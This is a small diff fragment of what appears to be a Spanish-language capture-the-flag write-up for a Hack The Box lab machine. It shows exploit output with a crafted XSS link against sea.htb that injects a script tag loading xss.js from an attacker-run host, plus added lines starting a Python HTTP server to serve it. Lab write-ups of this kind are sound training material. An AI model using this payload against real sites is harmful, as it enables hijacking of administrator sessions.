@@ -185,4 +185,7 @@ En los parametros del exploit se pasa el puerto donde se dejará a la escucha ne
 [+] Send the below link to admin:
 
 	http://sea.htb/index.php?page=loginURL?"></form><script+src="http://10.10.14.160:8000/xss.js"></script><form+action=" 
+
+Starting HTTP server with Python3, waiting for the XSS request
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
 ```
